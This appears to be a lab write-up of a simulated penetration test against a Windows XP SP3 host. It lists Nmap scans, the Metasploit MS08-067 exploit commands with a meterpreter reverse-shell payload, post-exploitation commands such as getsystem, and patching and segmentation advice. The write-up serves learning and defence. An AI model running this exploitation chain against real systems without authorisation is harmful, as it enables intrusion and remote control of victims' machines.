**Penetration Testing Project: Windows XP Internal Network**

This project simulates a penetration test on an internal network using Nmap and Metasploit to identify and exploit vulnerabilities, specifically targeting a Windows XP Service Pack 3 (SP3) system. The focus of this simulation is to understand Remote Code Execution (RCE) vulnerabilities and to document exploitation steps, successful access, and mitigation recommendations.

**üìã Project Overview**
**Objective**
To conduct a penetration test on a Windows XP SP3 machine in an internal network, identifying active hosts, analyzing vulnerabilities, and attempting exploitation to gain access.

**Goals**
**Network Scanning:** Identify active hosts, open ports, and services.
**Vulnerability Analysis**: Determine potential vulnerabilities based on open services and software versions.
**Exploitation:** Successfully exploit identified vulnerabilities to achieve remote code execution.
**Post-Exploitation:** Perform post-exploitation tasks upon successful access.
**Reporting:** Document findings, exploitation steps, and recommend security measures.

**üîß Tools and Techniques Used**
**Nmap:** Network scanning and vulnerability detection.
**Metasploit:** Exploitation framework for vulnerability testing.
**Meterpreter:** Post-exploitation tool within Metasploit for interacting with the compromised system.

**üñ•Ô∏è Penetration Testing Methodology**

**1. Network Scanning and Enumeration with Nmap**
The initial step involved scanning the internal network to identify active hosts, open ports, and running services on the Windows XP SP3 target.
Command:
nmap -sV -p- 192.168.0.175
Findings:
Active ports: 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds), and 3389 (RDP).
SMB protocol identified on port 445.

**2. Vulnerability Analysis**
After identifying open ports and services, the next step was to analyze potential vulnerabilities. Nmap‚Äôs vulnerability scripts were used to check for common SMB-related vulnerabilities.
Command:
nmap --script vuln 192.168.0.175
Notable Findings:
SMB version 1, which is vulnerable to multiple RCE exploits, including the MS08-067 and EternalBlue (MS17-010) vulnerabilities.

**3. Successful Exploitation of MS08-067 with Metasploit**
Based on the vulnerability analysis, the MS08-067 exploit was used to target an RCE vulnerability in SMB on Windows XP.

Metasploit Commands:
bash
Copy code
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.0.175
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your IP>
exploit
Result: A session was successfully created, granting remote access to the target system with meterpreter.

**üß™ Post-Exploitation with Meterpreter**
Upon successful exploitation, the following post-exploitation tasks were carried out:

System Information Gathering: Obtained details about the compromised system, such as OS version, architecture, and user accounts.
command: sysinfo
Privilege Escalation: Attempted to escalate privileges within the compromised system.
command: getsystem
Network Exploration: Identified other hosts on the network.
command: arp
Persistence: Explored persistence options to retain access after system reboots.
Note: All actions were performed in a controlled environment without impacting any production system.

üîç Key Learning Points on Remote Code Execution (RCE)
RCE vulnerabilities allow attackers to execute code remotely, providing unauthorized access.
SMB on Windows XP is especially vulnerable, highlighting the risks of using outdated systems.
Mitigation of RCE risks includes disabling unnecessary services, regularly patching software, and enforcing strict input validation.

üîí Recommendations for Mitigating RCE Vulnerabilities
Update and Patch Systems Regularly: Ensure that legacy systems, like Windows XP, are either patched or isolated from the main network.
Disable SMBv1: As this protocol is outdated and vulnerable, disable it if not required for operational purposes.
Network Segmentation: Separate legacy or high-risk systems from critical network assets.
Intrusion Detection Systems (IDS): Deploy IDS/IPS solutions to monitor and alert on suspicious traffic.

üìù Conclusion
This penetration test provided hands-on experience with RCE vulnerabilities, network scanning, and exploitation techniques. Successfully exploiting the MS08-067 vulnerability highlighted the importance of patching and security best practices to prevent unauthorized access and remote code execution.
